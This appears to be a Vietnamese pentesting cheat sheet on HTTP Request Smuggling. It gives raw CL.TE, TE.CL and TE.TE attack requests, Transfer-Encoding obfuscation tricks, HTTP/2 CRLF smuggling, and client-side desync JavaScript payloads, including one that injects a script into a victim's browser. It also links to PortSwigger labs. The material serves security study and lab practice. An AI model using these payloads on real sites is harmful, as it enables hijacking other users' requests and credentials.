# Request Smuggling

> HTTP Request Smuggling xảy ra khi nhiều "thành phần" cùng xử lý một request nhưng không thống nhất về cách xác định request bắt đầu/kết thúc ở đâu. Sự khác biệt này có thể được sử dụng để can thiệp vào request/response của người dùng khác hoặc bypass các cơ chế kiểm soát bảo mật. Nó thường xảy ra do các thành phần ưu tiên các HTTP header khác nhau (`Content-Length` so với `Transfer-Encoding`), khác biệt trong cách xử lý header không hợp lệ (ví dụ: có bỏ qua header chứa whitespace bất thường hay không), do downgrade request từ một protocol mới hơn, hoặc do khác biệt về thời điểm một partial request bị timeout và cần được loại bỏ.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Lỗ hổng CL.TE](#clte-vulnerabilities)
  * [Lỗ hổng TE.CL](#tecl-vulnerabilities)
  * [Lỗ hổng TE.TE](#tete-vulnerabilities)
  * [HTTP/2 Request Smuggling](#http2-request-smuggling)
  * [Client-Side Desync](#client-side-desync)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - Extension dành cho Burp Suite được thiết kế để hỗ trợ thực hiện các cuộc tấn công HTTP Request Smuggling.
* [defparam/Smuggler](https://github.com/defparam/smuggler) - Công cụ kiểm thử HTTP Request Smuggling / Desync được viết bằng Python 3.
* https://github.com/dhmosfunk/simple-http-smuggler-generator - Công cụ được phát triển cho kỳ thi Burp Suite Practitioner và các lab về HTTP Request Smuggling.

## Phương pháp

Nếu muốn khai thác HTTP Request Smuggling thủ công, bạn sẽ gặp một số vấn đề, đặc biệt với lỗ hổng TE.CL, vì phải tính toán kích thước chunk cho request thứ hai (malicious request), như PortSwigger đề cập: `Manually fixing the length fields in request smuggling attacks can be tricky.`

### Lỗ hổng CL.TE

> Front-end server sử dụng header `Content-Length`, còn back-end server sử dụng header `Transfer-Encoding`.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Ví dụ:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### Lỗ hổng TE.CL

> Front-end server sử dụng header `Transfer-Encoding`, còn back-end server sử dụng header `Content-Length`.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Ví dụ:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: Để gửi request này bằng Burp Repeater, trước tiên bạn cần vào menu Repeater và đảm bảo tùy chọn `"Update Content-Length"` đã được bỏ chọn. Bạn cần bao gồm chuỗi kết thúc `\r\n\r\n` sau `0` cuối cùng.

### Lỗ hổng TE.TE

> Cả front-end và back-end server đều hỗ trợ header `Transfer-Encoding`, nhưng một trong hai server có thể bị buộc không xử lý header này bằng cách obfuscate header theo một cách nào đó.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 Request Smuggling

HTTP/2 request smuggling có thể xảy ra nếu một máy chuyển đổi HTTP/2 request của bạn sang HTTP/1.1 và bạn có thể smuggle một `content-length` header không hợp lệ, `transfer-encoding` header hoặc các dòng mới (CRLF) vào request sau khi chuyển đổi. HTTP/2 request smuggling cũng có thể xảy ra trong một GET request nếu bạn có thể ẩn một HTTP/1.1 request bên trong HTTP/2 header.

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## Client-Side Desync

Trên một số path, server không mong đợi POST request và sẽ xử lý chúng như các GET request đơn giản, bỏ qua payload, ví dụ:

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

có thể được xử lý thành hai request trong khi thực tế nó chỉ nên là một request. Khi back-end server phản hồi hai lần, front-end server sẽ giả định rằng chỉ response đầu tiên liên quan đến request này.

Để khai thác điều này, attacker có thể sử dụng JavaScript để buộc victim gửi một POST request đến vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

Điều này có thể được sử dụng để:

* khiến vulnerable site lưu credentials của victim ở một nơi mà attacker có thể truy cập
* khiến victim gửi một exploit đến một site (ví dụ: các internal site mà attacker không thể truy cập, hoặc để khiến việc quy kết cuộc tấn công trở nên khó khăn hơn)
* khiến victim chạy JavaScript tùy ý dưới danh nghĩa của site

**Ví dụ**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

Script này yêu cầu trình duyệt của victim gửi một `POST` request đến `www.example.com/redirect`. Endpoint này trả về một redirect bị CORS chặn, khiến trình duyệt thực thi `catch` block bằng cách chuyển hướng đến `www.example.com`.

`www.example.com` lúc này xử lý không chính xác request `HEAD` nằm trong body của `POST`, thay vì request `GET` của trình duyệt. Nó trả về `404 not found` cùng với `content-length`, sau đó phản hồi request thứ ba bị diễn giải sai (`GET /x?x=<script>...`) và cuối cùng là request `GET` thực tế của trình duyệt.

Do trình duyệt chỉ gửi một request, nó chấp nhận response của request `HEAD` như response cho request `GET` của mình và diễn giải response thứ ba và thứ tư như body của response. Vì vậy, nó thực thi script của attacker.

## Labs

* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## Tài liệu tham khảo

* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)
* [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle (@albinowax) - August 10, 2022](https://web.archive.org/web/20220810190719/https://portswigger.net/research/browser-powered-desync-attacks)
* [HTTP Desync Attacks: Request Smuggling Reborn - James Kettle (@albinowax) - August 7, 2019](https://web.archive.org/web/20260228152820/https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [Request Smuggling Tutorial - PortSwigger - September 28, 2019](https://web.archive.org/web/20190821011451/https://portswigger.net/web-security/request-smuggling)
